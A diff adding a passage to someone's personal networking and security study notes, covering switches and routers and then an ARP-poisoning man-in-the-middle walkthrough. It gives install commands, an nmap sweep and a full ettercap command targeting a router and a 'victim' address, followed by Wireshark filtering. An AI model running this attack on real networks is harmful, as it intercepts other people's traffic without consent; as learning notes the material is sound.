@@ -61,6 +61,32 @@ More networks = more bits... steal them from the hosts (0). Below example needs 
  When you have the amount of hosts needed = SAVE the bits from right to left and hack the ones left over
 
 
+**[Packet Sniffing - NC](https://www.youtube.com/watch?v=-rSqbgI7oZM&t=638s)**
+
+_Watched Switches and Routers EP1 EP2 for CCNA Course_
+
+Switches and Routers NC 
+- Switches = Routers but better. LAYER 2! Data Link
+- CISCO packet tracer, provided two little test labs
+- Routers = Allow connectivity to different servers. Layer 3! Network
+
+_Methods of capturing traffic_
+
+1. ARP Poisoning (MIM attack - man in the middle attack)
+     - Putting yourself in between the router and the destination. Receiving all the traffic
+     - Download Wireshark (apt install wireshark)
+     - Download nmap (apt install nmap)
+     - Download ettercap (apt install ettercap-text-only)
+     - 1. Recon: sudonmap -sn <broadcast address>
+         - Get this by ip a. And then take the gateway/broadcast address
+         - Find desired device
+     - 2. sudo ettercap -T -S -i eth0 -M arp:remote (router) /10.0.0.1// /(victim)10.0.0.129//
+         - runs attack starts capturing traffic
+     - 3. run wireshark (sudo wireshark)
+         - filter out only traffic for victim (ip.addr == <ip address>
+     - 4. analyze packets (apackets.com), upload saved pcap file
+         
+
 **TryHackMe CyberSecurity Foundamentals**
 
 _Types of Browsers_
